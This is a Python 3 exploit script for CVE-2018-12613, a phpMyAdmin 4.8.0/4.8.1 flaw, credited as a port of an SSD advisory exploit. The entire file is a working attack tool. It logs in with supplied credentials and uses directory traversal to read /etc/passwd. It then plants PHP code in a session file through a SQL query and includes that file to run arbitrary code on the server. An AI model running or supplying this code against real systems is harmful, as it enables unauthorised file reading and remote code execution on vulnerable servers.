#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Modified standalone CVE-2018-12613 exploit ported to Python 3.
# This exploit is modified to work for Python 3's segregation of strings and bytes, test if phpMyAdmin version is of the 
# vulnerable 4.8.0 or 4.8.1, and whether the supplied phpMyAdmin username/password is correct.
# -------------------------------------------------------------------------------------------
# Original exploit here, all credits to SSD
# https://github.com/ssd-secure-disclosure/advisories/tree/master/SSD%20Advisory%20-%203700
# -------------------------------------------------------------------------------------------

import re
import sys
import random
import hashlib
import logging
import argparse
import requests
import html #Added to unescape HTML for Python 3.4+
from html.parser import HTMLParser

logger = logging
logging.basicConfig(level=logging.DEBUG, format='%(levelname)s: %(message)s')
URL = None
PROXIES = dict()
page = '/index.php'

def _rand_md5():
    return hashlib.md5(str(random.randint(0, 10000000000000000000)).encode('utf-8')).hexdigest()

def get_token(sess, page):
    resp = sess.get(URL + page)
    #Check that version is vulnerable
    if not bool(re.findall(r'PMA_VERSION:"4.8.[0-1]"',resp.text)):
        logger.error('phpMyAdmin version neither 4.8.0 or 4.8.1, not vulnerable, exiting')
        return None

    try:
        resp.encoding = 'utf-8' #optional, specified for clarity
        token = re.findall(r'token"\s*value="([^"]*)"', resp.text, flags=re.MULTILINE)[0]
    except IndexError:
        logger.error('Failed to get CSRF token from server')
        return None
    return html.unescape(token) #Python 3.4+ for HTML unescape

def check_login(response):
    if bool(re.findall(r'Cannot log in',response.text)):
        logger.error('Incorrect username or password')
        return True
    else:
        return False

def main(username, password, php_code, page):
    session = requests.Session()
    session.proxies = PROXIES
    token = get_token(session, page)
    #Terminate early if token can't retrieve or version not vulnerable
    if token == None:
        return 1
    logger.info('phpMyAdmin version is vulnerable, proceeding')
    session_id = _rand_md5()
    response = session.post(URL + page, data={
        'set_session': session_id,
        'pma_username': username,
        'pma_password': password,
        'server': 1,
        'target': 'index.php',
        'token': token
    })
    if check_login(response):
        return 1 #Exits if can't login
    updir = None
    for dir_level in range(12):
        updir = '../' * dir_level
        response = session.get(URL + page, params={
            'target': 'sql.php%3F/../' + updir + 'etc/passwd'
        })
        response.encoding = 'utf-8' #Optional, specified for clarity
        if '/sbin/nologin' in response.text:
            logger.info('/etc/passwd is %d levels away', dir_level)
            break
    else:
        logger.error('Server not running Linux, exiting')
        return 1
    token = get_token(session, '/server_sql.php')
    sql = ("select '<?php " + php_code + " ?>'")
    logger.debug('Executing SQL query %r', sql)
    response = session.post(URL + '/import.php', data={
        'is_js_confirmed': 0,
        'token': token,
        'pos': 0,
        'goto': 'server_sql.php',
        'message_to_show': 'Your SQL query has been executed successfully',
        'prev_sql_query': '',
        'sql_query': sql,
        'sql_delimiter': ';',
        'show_query': 1,
        'fk_checks': 0,
        'SQL': 'Go',
        'ajax_request': 'true'
    })
    response = session.get(URL + '/index.php', params={
        'target': ('db_sql.php%3f/../' + updir + 'var/lib/php/sessions/sess_' + session.cookies['phpMyAdmin'])
    })
    site = open('result.html', 'w')
    response.encoding = 'utf-8' #Optional, specified for clarity.
    site.write(response.text)
    if response.status_code == 200:
        logger.info('Payload successful. Result is stored inside "result.html" file.')
    else:
        logger.error("Couldn't run payload")
        return 1
    return 0

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--user', required=True)
    parser.add_argument('-p', '--password', required=True)
    parser.add_argument('-U', '--url', required=True)
    parser.add_argument('-P', '--php-payload', required=True)
    args = parser.parse_args()
    URL = args.url
    sys.exit(main(args.user, args.password, args.php_payload, page))
